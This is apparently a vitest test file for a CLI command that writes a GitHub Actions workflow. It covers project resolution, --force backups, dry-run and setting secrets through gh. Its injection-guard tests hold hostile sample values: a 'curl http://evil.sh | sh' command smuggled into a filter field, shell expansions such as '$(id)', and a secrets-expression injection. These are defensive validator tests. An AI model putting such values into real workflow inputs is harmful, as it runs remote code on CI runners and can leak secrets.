import type { SpawnSyncReturns } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Command } from 'commander';
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  buildGithubWorkflow,
  createCiCommand,
  parseTimeoutSeconds,
  renderCiInitText,
  runCiInit,
  type CiDeps,
  type CiFs,
  type CiInitOptions,
  type CiInitSummary,
  type SpawnImpl,
} from './ci.js';
import { ApiError } from '../lib/errors.js';

// ── harness ──────────────────────────────────────────────────────────────────

function makeFetch(
  handler: (url: string, init: RequestInit) => { status?: number; body: unknown },
): typeof globalThis.fetch {
  return (async (input: string | URL | Request, init: RequestInit = {}) => {
    const url =
      typeof input === 'string'
        ? input
        : input instanceof URL
          ? input.toString()
          : (input as { url: string }).url;
    const { status = 200, body } = handler(url, init);
    return new Response(JSON.stringify(body), {
      status,
      headers: { 'content-type': 'application/json' },
    });
  }) as typeof globalThis.fetch;
}

function makeCreds(apiKey = 'sk-user-test', apiUrl = 'http://localhost:13599') {
  return { TESTSPRITE_API_KEY: apiKey, TESTSPRITE_API_URL: apiUrl } as NodeJS.ProcessEnv;
}

/** In-memory fs seam: exclusive writes throw EEXIST, matching the real O_EXCL. */
function makeFakeFs(seed: Record<string, string> = {}): CiFs & { files: Map<string, string> } {
  const files = new Map<string, string>(Object.entries(seed));
  return {
    files,
    async writeFile(target, data, opts) {
      if (opts?.exclusive && files.has(target)) {
        const err = new Error('EEXIST') as NodeJS.ErrnoException;
        err.code = 'EEXIST';
        throw err;
      }
      files.set(target, data);
    },
    async mkdir() {
      /* recursive mkdir is a no-op in memory */
    },
    async readFile(target) {
      const v = files.get(target);
      if (v === undefined) {
        const err = new Error('ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        throw err;
      }
      return v;
    },
  };
}

function spawnResult(over: Partial<SpawnSyncReturns<string>> = {}): SpawnSyncReturns<string> {
  return { pid: 1, output: [], stdout: '', stderr: '', status: 0, signal: null, ...over };
}

/** Hermetic spawn: `git symbolic-ref` → origin/main, everything else → ok. Keeps
 * unit tests off real `git`/`gh` subprocesses. */
const noopSpawn: SpawnImpl = cmd =>
  cmd === 'git' ? spawnResult({ stdout: 'origin/main\n' }) : spawnResult();

function collect() {
  const out: string[] = [];
  const err: string[] = [];
  return {
    out,
    err,
    stdout: (l: string) => out.push(l),
    stderr: (l: string) => err.push(l),
    json: () => JSON.parse(out.join('\n')),
  };
}

const base = {
  profile: 'default',
  output: 'json' as const,
  endpointUrl: undefined,
  debug: false,
  verbose: false,
  dryRun: false,
  requestTimeoutMs: undefined,
};

function opts(over: Partial<CiInitOptions> = {}): CiInitOptions {
  return {
    ...base,
    platform: 'github',
    timeoutSeconds: 600,
    workflowPath: '.github/workflows/testsprite.yml',
    force: false,
    setSecret: false,
    ...over,
  };
}

function projectsBody(ids: string[], nextToken: string | null = null) {
  return { items: ids.map(id => ({ id, name: id, type: 'frontend' })), nextToken };
}

const WF = join('/repo', '.github/workflows/testsprite.yml');

/** Base deps for a runCiInit call: in-memory fs, hermetic spawn, /repo cwd. */
function deps(over: Partial<CiDeps> = {}): CiDeps {
  return {
    env: makeCreds(),
    fs: makeFakeFs(),
    spawn: noopSpawn,
    cwd: '/repo',
    stdout: () => {},
    stderr: () => {},
    ...over,
  };
}

// ── buildGithubWorkflow (design A: delegate to the pinned action) ─────────────

const WF_BASE = {
  projectId: 'proj-1',
  timeoutSeconds: 600,
  cliVersion: '0.7.0',
  defaultBranch: 'main',
};

describe('buildGithubWorkflow', () => {
  it('delegates to the pinned action with the key from a secret (no inline CLI)', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toContain('uses: TestSprite/testsprite-action@v1');
    expect(yaml).toContain('api-key: ${{ secrets.TESTSPRITE_API_KEY }}');
    expect(yaml).toContain('project: "proj-1"');
    expect(yaml).toContain('cli-version: "0.7.0"'); // pinned, not `latest`
    expect(yaml).toContain('timeout: "600"');
    expect(yaml).not.toContain('npm install'); // the action installs the CLI
    expect(yaml).not.toContain('testsprite test run');
  });

  it('sets least-privilege permissions and a fork-PR guard', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toContain('permissions:');
    expect(yaml).toContain('contents: read');
    expect(yaml).toContain('github.event.pull_request.head.repo.full_name == github.repository');
  });

  it('pins the push trigger to the detected default branch (quoted)', () => {
    expect(buildGithubWorkflow(WF_BASE)).toContain('branches: ["main"]');
    expect(buildGithubWorkflow({ ...WF_BASE, defaultBranch: 'master' })).toContain(
      'branches: ["master"]',
    );
  });

  it('injects filter / endpoint-url only when given', () => {
    expect(buildGithubWorkflow({ ...WF_BASE, filter: 'checkout' })).toContain('filter: "checkout"');
    expect(buildGithubWorkflow(WF_BASE)).not.toContain('filter:');
    expect(
      buildGithubWorkflow({ ...WF_BASE, endpointUrl: 'https://selfhosted.example:8443' }),
    ).toContain('endpoint-url: "https://selfhosted.example:8443"');
    expect(buildGithubWorkflow(WF_BASE)).not.toContain('endpoint-url:');
  });

  it('rejects values that would break or hijack the workflow YAML (injection guard)', () => {
    const evil = [
      'a\nname: pwned', // newline breaks the mapping
      'a" && curl http://evil.sh | sh #', // closes the scalar, runs a second command
      '$(id)-`whoami`', // shell expansion vectors
      '${{ secrets.TESTSPRITE_API_KEY }}', // Actions evaluates it before the job
    ];
    for (const filter of evil) {
      expect(() => buildGithubWorkflow({ ...WF_BASE, filter })).toThrow(ApiError);
    }
    expect(() => buildGithubWorkflow({ ...WF_BASE, projectId: 'a"b' })).toThrow(ApiError);
    expect(() => buildGithubWorkflow({ ...WF_BASE, endpointUrl: 'https://x`y' })).toThrow(ApiError);
  });
});

describe('renderCiInitText', () => {
  const s = (over: Partial<CiInitSummary>): CiInitSummary => ({
    platform: 'github',
    path: '.github/workflows/testsprite.yml',
    action: 'TestSprite/testsprite-action@v1',
    projectId: 'p',
    wrote: true,
    status: 'written',
    backupPath: null,
    filter: null,
    endpointUrl: null,
    endpointWarning: null,
    timeoutSeconds: 600,
    secret: { name: 'TESTSPRITE_API_KEY', attempted: false, set: false, reason: null },
    ...over,
  });

  it('renders a distinct first line for each of the three wrote states', () => {
    expect(renderCiInitText(s({ status: 'written', wrote: true }))).toContain('Wrote .github');
    expect(renderCiInitText(s({ status: 'preview', wrote: false }))).toContain(
      'Would write .github',
    );
    // The no-op case must NOT read as a dry-run preview.
    const unchanged = renderCiInitText(s({ status: 'unchanged', wrote: false }));
    expect(unchanged).toContain('already up to date');
    expect(unchanged).not.toContain('Would write');
  });
});

describe('parseTimeoutSeconds', () => {
  it('defaults, accepts a valid range, rejects out-of-range / non-integer', () => {
    expect(parseTimeoutSeconds(undefined)).toBe(600);
    expect(parseTimeoutSeconds('120')).toBe(120);
    expect(() => parseTimeoutSeconds('0')).toThrow(ApiError);
    expect(() => parseTimeoutSeconds('5000')).toThrow(ApiError);
    expect(() => parseTimeoutSeconds('x')).toThrow(ApiError);
  });
});

// ── runCiInit ────────────────────────────────────────────────────────────────

describe('runCiInit', () => {
  it('auto-resolves the project when the key has exactly one, and writes the workflow', async () => {
    const io = collect();
    const fs = makeFakeFs();
    let seenUrl = '';
    await runCiInit(
      opts(),
      deps({
        fs,
        ...io,
        fetchImpl: makeFetch(url => {
          seenUrl = url;
          return { body: projectsBody(['only-proj']) };
        }),
      }),
    );
    expect(seenUrl).toContain('/projects');
    expect(fs.files.get(WF)).toContain('project: "only-proj"');
    expect(io.json()).toMatchObject({
      wrote: true,
      projectId: 'only-proj',
      action: 'TestSprite/testsprite-action@v1',
      path: '.github/workflows/testsprite.yml',
    });
  });

  it('explicit --project skips the network call', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const fetchImpl = vi.fn(makeFetch(() => ({ body: projectsBody(['x']) })));
    await runCiInit(opts({ project: 'given-proj' }), deps({ fs, fetchImpl, ...io }));
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(fs.files.get(WF)).toContain('project: "given-proj"');
  });

  it('zero projects → VALIDATION_ERROR', async () => {
    await expect(
      runCiInit(opts(), deps({ fetchImpl: makeFetch(() => ({ body: projectsBody([]) })) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('more than one project (a full page or a nextToken) → VALIDATION_ERROR', async () => {
    await expect(
      runCiInit(opts(), deps({ fetchImpl: makeFetch(() => ({ body: projectsBody(['a', 'b']) })) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    // one item on the page but a nextToken means there are more.
    await expect(
      runCiInit(
        opts(),
        deps({ fetchImpl: makeFetch(() => ({ body: projectsBody(['a'], 'more') })) }),
      ),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('emits the resolved endpoint (from the profile), not just the flag', async () => {
    // makeCreds sets TESTSPRITE_API_URL to a non-default host → workflow pins it.
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs }));
    expect(fs.files.get(WF)).toContain('endpoint-url: "http://localhost:13599"');
  });

  it('omits endpoint-url for the default production backend', async () => {
    const fs = makeFakeFs();
    await runCiInit(
      opts({ project: 'p' }),
      deps({
        fs,
        env: { TESTSPRITE_API_KEY: 'k', TESTSPRITE_API_URL: 'https://api.testsprite.com' },
      }),
    );
    expect(fs.files.get(WF)).not.toContain('endpoint-url:');
  });

  it('refuses to clobber an existing workflow without --force', async () => {
    await expect(
      runCiInit(opts({ project: 'p' }), deps({ fs: makeFakeFs({ [WF]: 'old contents' }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('--force backs up the old file then overwrites', async () => {
    const io = collect();
    const fs = makeFakeFs({ [WF]: 'old contents' });
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs, ...io }));
    expect(fs.files.get(`${WF}.bak`)).toBe('old contents');
    expect(fs.files.get(WF)).toContain('project: "p"');
    expect(io.json()).toMatchObject({
      wrote: true,
      backupPath: join('.github/workflows', 'testsprite.yml.bak'),
    });
  });

  it('honors a custom --path', async () => {
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p', workflowPath: 'ci/ts.yml' }), deps({ fs }));
    expect(fs.files.get(join('/repo', 'ci/ts.yml'))).toContain(
      'uses: TestSprite/testsprite-action',
    );
  });

  it('--dry-run makes no writes, previews to stderr, still emits the summary', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const fetchImpl = vi.fn(makeFetch(() => ({ body: projectsBody(['x']) })));
    await runCiInit(opts({ dryRun: true }), deps({ fs, fetchImpl, ...io }));
    expect(fs.files.size).toBe(0);
    expect(fetchImpl).not.toHaveBeenCalled(); // no network under dry-run
    expect(io.err.join('\n')).toContain('[dry-run]');
    expect(io.json()).toMatchObject({ wrote: false, projectId: '<your-project-id>' });
  });

  it('--set-secret shells out to gh with the key on STDIN (never argv) in cwd', async () => {
    const io = collect();
    const spawn = vi.fn(noopSpawn);
    await runCiInit(
      opts({ project: 'p', setSecret: true, repo: 'me/app' }),
      deps({ env: makeCreds('sk-user-secret'), spawn, ...io }),
    );
    expect(spawn).toHaveBeenCalledWith(
      'gh',
      ['secret', 'set', 'TESTSPRITE_API_KEY', '--repo', 'me/app'],
      { input: 'sk-user-secret', cwd: '/repo' },
    );
    expect(io.json()).toMatchObject({ secret: { attempted: true, set: true } });
  });

  it('--set-secret degrades (warns, still succeeds) when gh is absent', async () => {
    const io = collect();
    const spawn: SpawnImpl = cmd => {
      if (cmd === 'git') return spawnResult({ stdout: 'origin/main\n' });
      const err = new Error('spawn gh ENOENT') as NodeJS.ErrnoException;
      err.code = 'ENOENT';
      return spawnResult({ status: null, error: err });
    };
    await runCiInit(opts({ project: 'p', setSecret: true }), deps({ spawn, ...io }));
    const summary = io.json();
    expect(summary.wrote).toBe(true); // scaffold still succeeds
    expect(summary.secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('gh CLI not found');
  });

  it('--set-secret degrades when gh exits non-zero (unauthenticated)', async () => {
    const io = collect();
    const spawn: SpawnImpl = cmd =>
      cmd === 'git'
        ? spawnResult({ stdout: 'origin/main\n' })
        : spawnResult({ status: 1, stderr: 'gh: not logged in\n' });
    await runCiInit(opts({ project: 'p', setSecret: true }), deps({ spawn, ...io }));
    expect(io.json().secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('gh exited 1');
  });

  it('--set-secret with no resolvable API key does not set the secret', async () => {
    const io = collect();
    await runCiInit(
      opts({ project: 'p', setSecret: true }),
      deps({ env: {}, ...io }), // no TESTSPRITE_API_KEY
    );
    expect(io.json().secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('no API key');
  });

  it('warns (does not fail) when the resolved endpoint is loopback / unreachable from a hosted runner', async () => {
    const io = collect();
    // makeCreds pins http://localhost:13599 — unreachable from a GitHub runner.
    await runCiInit(opts({ project: 'p' }), deps({ ...io }));
    expect(io.err.join('\n')).toContain('a GitHub-hosted runner cannot reach');
    const summary = io.json();
    expect(summary.wrote).toBe(true); // it still scaffolds
    expect(summary.endpointWarning).toContain('http://localhost:13599');
  });

  it('rejects a bad --filter up front, before the project-list request', async () => {
    const fetchImpl = vi.fn(makeFetch(() => ({ body: projectsBody(['x']) })));
    await expect(
      runCiInit(opts({ filter: 'a" && curl x | sh' }), deps({ fetchImpl })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    expect(fetchImpl).not.toHaveBeenCalled(); // failed before the round trip
  });

  it('re-running on byte-identical content is a no-op (no rewrite, no .bak, no error)', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs }));
    const first = fs.files.get(WF);
    // Second run, no --force: identical content ⇒ no error, nothing rewritten.
    await runCiInit(opts({ project: 'p' }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toBe(first);
    expect(fs.files.has(`${WF}.bak`)).toBe(false);
    expect(io.json()).toMatchObject({ wrote: false, status: 'unchanged', backupPath: null });
  });

  it('falls back to the main branch when git cannot report a default (the real-world case)', async () => {
    const fs = makeFakeFs();
    // git absent / no origin/HEAD → detectDefaultBranch returns "main".
    const spawn: SpawnImpl = cmd => {
      if (cmd === 'git') {
        const err = new Error('spawn git ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        return spawnResult({ status: null, error: err });
      }
      return spawnResult();
    };
    await runCiInit(opts({ project: 'p' }), deps({ fs, spawn }));
    expect(fs.files.get(WF)).toContain('branches: ["main"]');
  });

  it('rejects an unsupported platform', async () => {
    await expect(
      runCiInit(opts({ platform: 'gitlab', project: 'p' }), deps()),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });
});

// ── command builder (Commander wiring) ───────────────────────────────────────

describe('createCiCommand', () => {
  it('parses flags through the builder and runs the action (dry-run, no fs/network)', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const fetchImpl = vi.fn(makeFetch(() => ({ body: projectsBody(['x']) })));
    const program = new Command();
    program.option('--output <mode>', 'output mode', 'text').option('--dry-run', 'preview only');
    program.addCommand(
      createCiCommand({
        fs,
        fetchImpl,
        env: makeCreds(),
        spawn: noopSpawn,
        cwd: '/repo',
        stdout: io.stdout,
        stderr: io.stderr,
      }),
    );
    await program.parseAsync(
      [
        '--dry-run',
        '--output',
        'json',
        'ci',
        'init',
        'github',
        '--project',
        'p',
        '--timeout',
        '90',
      ],
      { from: 'user' },
    );
    expect(fetchImpl).not.toHaveBeenCalled(); // explicit --project: no lookup
    expect(fs.files.size).toBe(0); // dry-run: no write
    expect(io.json()).toMatchObject({
      platform: 'github',
      wrote: false,
      projectId: 'p', // --project threaded through the builder
      timeoutSeconds: 90, // --timeout parsed + threaded
    });
  });
});

// ── default node fs seam (real filesystem) ───────────────────────────────────

describe('runCiInit with the real fs seam', () => {
  let dir: string;
  afterEach(() => {
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('writes the workflow to a real temp dir and refuses to clobber without --force', async () => {
    dir = mkdtempSync(join(tmpdir(), 'ci-init-'));
    const io = collect();
    // No `fs` dep → exercises defaultCiFs (real writeFile/mkdir with O_EXCL).
    await runCiInit(opts({ project: 'real-fs-proj' }), {
      env: makeCreds(),
      spawn: noopSpawn,
      cwd: dir,
      stdout: io.stdout,
      stderr: io.stderr,
    });
    // eslint-disable-next-line security/detect-non-literal-fs-filename -- reads this test's own mkdtempSync temp path, never user input.
    const written = readFileSync(join(dir, '.github/workflows/testsprite.yml'), 'utf8');
    expect(written).toContain('project: "real-fs-proj"');

    // A second run that would write DIFFERENT content, without --force, must hit
    // the real O_EXCL EEXIST → VALIDATION_ERROR (identical content is a no-op,
    // covered separately).
    await expect(
      runCiInit(opts({ project: 'a-different-proj' }), {
        env: makeCreds(),
        spawn: noopSpawn,
        cwd: dir,
        stdout: () => {},
        stderr: () => {},
      }),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });
});
